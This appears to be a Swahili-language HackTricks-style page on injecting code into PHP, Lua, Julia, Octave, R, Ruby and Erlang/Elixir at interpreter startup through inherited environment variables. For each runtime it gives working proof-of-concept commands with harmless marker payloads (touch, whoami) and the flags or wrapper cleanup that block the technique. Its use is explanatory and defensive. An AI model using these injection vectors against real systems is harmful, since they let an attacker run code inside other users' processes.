# Sindano ya Wakati wa Kuanzisha Interpreter ya macOS kupitia Vigezo vya Mazingira

{{#include ../../../banners/hacktricks-training.md}}

Mbinu hizi mahususi za runtime hutumia vigezo vya mazingira vilivyorithishwa kuchagua usanidi wa kuanzisha, kupakia code mapema, au kutoa VM flags kabla ya workload iliyokusudiwa. Baadhi ya mbinu hutumia faili; Lua na Erlang pia zinaweza kutekeleza code iliyoingizwa moja kwa moja.

## Usanidi wa kuanzisha PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` na `auto_prepend_file`

PHP CLI na CGI husoma usanidi kila zinapoendeshwa. `PHPRC` inaweza kuchagua `php.ini` inayoweza kusomwa na mshambuliaji, huku `PHP_INI_SCAN_DIR` ikielekeza upya saraka inayochunguzwa kwa faili za ziada za `.ini`. Directive ya `auto_prepend_file` huifanya PHP kuchanganua faili kabla ya script iliyoombwa, hivyo mchanganyiko huu husababisha utekelezaji wa code wakati wa kuanzisha.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Njia nyingine ni saraka iliyo na faili ya `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Chaguo la `-n` hupuuza `php.ini`; njia ya `-c` inayoaminika iliyobainishwa wazi hutangulia `PHPRC`. Kumbuka kwamba SAPI ya seva inayoendesha kwa muda mrefu kwa kawaida husoma usanidi seva ya wavuti inapoanza, ilhali CLI na CGI hufanya hivyo kila zinapoendeshwa.<sup>[[1]](#references)</sup>

## Msimbo wa kuanzisha Lua

### `LUA_INIT`

Kabla ya kuchakata chaguo za mstari wa amri au hati lengwa, mkalimani huru wa Lua hutekeleza `LUA_INIT_<major>_<minor>` au, ikiwa kigezo chenye toleo hakipo, `LUA_INIT`. Thamani inayoanza na `@` hutaja faili; thamani nyingine yoyote hutathminiwa moja kwa moja kama msimbo wa Lua. Hii huwezesha utekelezaji wa kuanzisha unaotumia faili au usiotumia faili.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Jina halisi lenye toleo hubadilika kulingana na interpreter, kwa mfano `LUA_INIT_5_4`. `lua -E` hupuuza vigeu vyote vya mazingira, ikijumuisha msimbo wa kuanzisha na njia za moduli za Lua.

## Depot ya kuanzisha ya Julia

### `JULIA_DEPOT_PATH` na `startup.jl`

Kwa kawaida Julia hutekeleza `config/startup.jl` kutoka depot yake ya kwanza wakati wa kuanzisha. `JULIA_DEPOT_PATH` hudhibiti orodha ya depot, kwa hivyo kuielekeza kwenye mti ambao mshambulizi anaweza kuusoma huelekeza upya faili ya kuanzisha inayopakiwa kiotomatiki.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Kitenganishi cha mwisho ni muhimu ikiwa mwathiriwa bado anahitaji vifurushi vyake vya kawaida. `julia --startup-file=no` huzima startup file hii. Futa variable kabla ya kuzindua kwa sababu pia hudhibiti package registries, environments, caches na maeneo ya kupakia code.

## Startup files za GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave huendesha faili kadhaa zilizo na amri halali za Octave wakati wa kuwasha. `OCTAVE_SITE_INITFILE` hubatilisha startup file ya mfumo mzima, na `OCTAVE_VERSION_INITFILE` hubatilisha ile mahususi kwa toleo, hivyo variable yoyote kati ya hizi inaweza kuelekeza utekelezaji wa kiotomatiki kwenye faili inayoweza kusomwa na mshambulizi.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` huruka faili za mtumiaji pekee kama `~/.octaverc`; **haizuii** ubadilishaji wa faili ya site ulioelezwa hapo juu. Tumia `--no-site-file` kwa faili za site, au `--norc` / `-f` ili kuzima faili zote za startup.<sup>[[7]](#references)</sup>

## Profaili za startup za R na upakiaji wa package

### `R_PROFILE_USER` / `R_PROFILE`

Wakati wa startup, R hupakia faili za profaili za site na mtumiaji zilizo na code ya R. `R_PROFILE` huchagua profaili ya site na `R_PROFILE_USER` huchagua profaili ya mtumiaji, hivyo mazingira yaliyorithiwa yanaweza kuelekeza mojawapo ya utafutaji huo kwenye faili inayoweza kusomwa na mshambuliaji.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` huruka profile ya mtumiaji, `--no-site-file` huruka profile ya site, na `--vanilla` hujumuisha ulinzi wote wawili. R kwanza huchakata faili za mazingira zilizochaguliwa na `R_ENVIRON` na `R_ENVIRON_USER`, lakini faili hizo huweka vigeu pekee; vigeu vya profile ndio njia ya moja kwa moja ya kutekeleza msimbo wowote.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` na njia za maktaba

R huambatisha vifurushi vilivyotenganishwa kwa koma katika `R_DEFAULT_PACKAGES` wakati wa kuwasha. `Rscript` hutanguliza `R_SCRIPT_DEFAULT_PACKAGES`. Kuchanganya mojawapo ya vigeu hivi na `R_LIBS`, `R_LIBS_USER`, au `R_LIBS_SITE` kunaweza kufanya R itafute na kupakia kifurushi kilichosakinishwa kinachodhibitiwa na mshambulizi; hook yake ya `.onLoad` au `.onAttach` hutekelezwa kiotomatiki.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Hii inahitaji kifurushi cha R kilichosakinishwa chenye muundo halali, si faili huru la `.R` tu. `--vanilla` haiondoi vigezo vilivyorithiwa moja kwa moja, kwa hiyo wrapper inayoaminika lazima iondoe au ibadilishe vigezo vya kifurushi chaguomsingi na njia za maktaba, pamoja na kuzima faili za profile.

## Chaguo za Ruby loader

### RUBYOPT

Ruby huchanganua swichi za mstari wa amri zinazotumika kutoka kwenye kigezo cha mazingira cha `RUBYOPT` kabla ya kutekeleza script. Ruby hukataa utekelezaji wa msimbo kupitia `-e` kwenye `RUBYOPT`, lakini `-I` inaweza kuongeza saraka ya utafutaji wa maktaba mwanzoni, na `-r` inaweza kuhitaji maktaba. Kwa hiyo, mchakato unaoanzisha Ruby ukiwa na vigezo vya mazingira vinavyodhibitiwa na mshambuliaji unaweza kulazimishwa kupakia msimbo wa Ruby unaodhibitiwa na mshambuliaji.<sup>[[10]](#references)</sup>

Unda `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Unda script ya Ruby isiyo na madhara kama vile `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Iendeshe kwa thamani iliyodhibitiwa ya `RUBYOPT`:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Ili kuzima tabia hii, pitisha `--disable=rubyopt` (au `--disable-rubyopt`) **kabla** ya jina la script:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Chaguo lililoandikwa baada ya `hello.rb` hupitishwa kwa script kupitia `ARGV`; halizuii Ruby kuchakata `RUBYOPT` mapema.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Badala ya kuweka saraka ya load mwanzoni kwa kutumia `-I` ndani ya `RUBYOPT`, variable tofauti ya mazingira `RUBYLIB` huongeza saraka kwenye `$LOAD_PATH` ya Ruby. Ikiunganishwa na `RUBYOPT=-r<module>`, hupakia code ya mshambuliaji bila kuhitaji `-I` ndani ya `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Alama za VM za Erlang na Elixir

### `ERL_AFLAGS`, `ERL_FLAGS`, na `ERL_ZFLAGS`

Kizindua `erl` huongeza `ERL_AFLAGS` mwanzoni mwa mstari wake wa amri na `ERL_FLAGS` / `ERL_ZFLAGS` mwishoni. Kwa kuwa `-eval` hutathmini usemi wa Erlang wakati wa uanzishaji wa VM, vigeu hivi vinaweza kuwezesha fileless code execution kabla ya mzigo wa kazi uliokusudiwa.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix na matoleo mengi ya Elixir hatimaye huwasha Erlang VM na huenda yakarithi flags hizi. Thibitisha wrapper halisi ya release: inaweza kuunda upya au kusafisha hoja za VM, huku baadhi ya zana zikiunga mkono waziwazi `ERL_AFLAGS`, `ERL_ZFLAGS`, au `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

Tofauti na mbinu nyingi zinazotegemea faili, payload ya `-eval` haihitaji faili inayodhibitiwa na mshambuliaji. Wrapper inayoaminika inapaswa kufuta vigeu vyote vitatu vya Erlang flag (na `ELIXIR_ERL_OPTIONS` kwa Elixir) kabla ya kuwasha runtime; usijaribu kuruhusu VM flags mahususi pekee isipokuwa parser na mpangilio wake umeeleweka kikamilifu.

## References

- [1] [Faili ya usanidi ya PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 standalone interpreter](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Kiolesura cha mstari wa amri cha Julia: Faili ya kuanzisha](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Vigeu vya mazingira vya Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Faili za kuanzisha za GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Chaguo za mstari wa amri za GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Uanzishaji mwanzoni mwa kipindi cha R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Usakinishaji na usimamizi wa R: Vifurushi vya nyongeza](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Nyaraka za Ruby - Chaguo za mstari wa amri za Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [Amri ya `erl` na vigeu vya mazingira](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Matoleo ya Elixir na chaguo za mazingira za VM](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
